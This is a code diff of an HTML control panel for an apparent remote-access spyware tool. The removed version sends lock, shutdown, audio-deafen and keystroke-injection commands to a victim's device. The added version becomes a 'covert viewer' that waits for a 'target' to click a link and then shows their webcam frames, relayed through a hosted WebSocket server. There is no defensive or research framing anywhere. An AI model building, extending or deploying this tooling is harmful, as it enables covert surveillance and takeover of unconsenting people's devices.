@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OmniLink Controller</title>
+    <title>OmniLink Viewer</title>
     <style>
         body {
             background: #050505;
@@ -14,86 +14,40 @@
             padding: 20px;
         }
 
+        img {
+            max-width: 80%;
+            border: 2px solid #00ffcc;
+            border-radius: 5px;
+            box-shadow: 0 0 15px #00ffcc;
+        }
+
         h1 {
             text-shadow: 0 0 10px #00ffcc;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        button {
-            background: transparent;
-            border: 1px solid #00ffcc;
-            color: #00ffcc;
-            padding: 15px;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 1rem;
-            transition: 0.3s;
-            margin-bottom: 10px;
-        }
-
-        button:active {
-            background: #00ffcc;
-            color: black;
-        }
-
-        input {
-            width: 80%;
-            padding: 10px;
-            margin-bottom: 15px;
-            background: black;
-            color: #00ffcc;
-            border: 1px solid #00ffcc;
         }
     </style>
 </head>
 
 <body>
-    <h1>REMOTE CONTROL</h1>
-
-    <div class="grid">
-        <button onclick="sendCommand('DEAFEN')">DEAFEN SYSTEM</button>
-        <button onclick="sendCommand('UNDEAFEN')">UNDEAFEN</button>
-        <button onclick="sendCommand('LOCK')">LOCK DEVICE</button>
-        <button onclick="sendCommand('SHUTDOWN')">SHUTDOWN</button>
-    </div>
-
-    <input type="text" id="cmdInput" placeholder="Type to inject into their keyboard...">
-    <button onclick="sendTypeCommand()" style="width: 80%;">INJECT TEXT</button>
+    <h1>COVERT VIEWER</h1>
+    <p>Waiting for target to click the link...</p>
+    <img id="targetCam" src="" alt="No Signal" style="display:none;">
 
     <script>
         const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
-        const host = window.location.host || "127.0.0.1:8000";
-        const wsUrl = `${protocol}//${host}/ws/controller`;
-        
-        let ws = new WebSocket(wsUrl);
+        const host = window.location.host || "hangon-k31m.onrender.com";
+        let ws = new WebSocket(`${protocol}//${host}/ws/controller`);
 
-        ws.onopen = () => console.log("Control link established at " + wsUrl);
-        ws.onerror = (e) => console.error("WebSocket error:", e);
-        ws.onclose = () => console.log("WebSocket connection closed.");
+        ws.onopen = () => console.log("Viewer connected to server.");
 
-        function sendCommand(cmd) {
-            if (ws.readyState === WebSocket.OPEN) {
-                ws.send(cmd);
-            } else {
-                console.warn("WebSocket is not connected.");
+        ws.onmessage = function (event) {
+            if (event.data.startsWith("VIDEO:")) {
+                // Extract the base64 image and display it
+                const imgData = event.data.replace("VIDEO:", "");
+                const img = document.getElementById('targetCam');
+                img.src = imgData;
+                img.style.display = 'inline-block';
             }
-        }
-
-        function sendTypeCommand() {
-            let text = document.getElementById('cmdInput').value;
-            if (ws.readyState === WebSocket.OPEN) {
-                ws.send("KEY_TYPE " + text);
-            } else {
-                console.warn("WebSocket is not connected.");
-            }
-        }
+        };
     </script>
 </body>
 
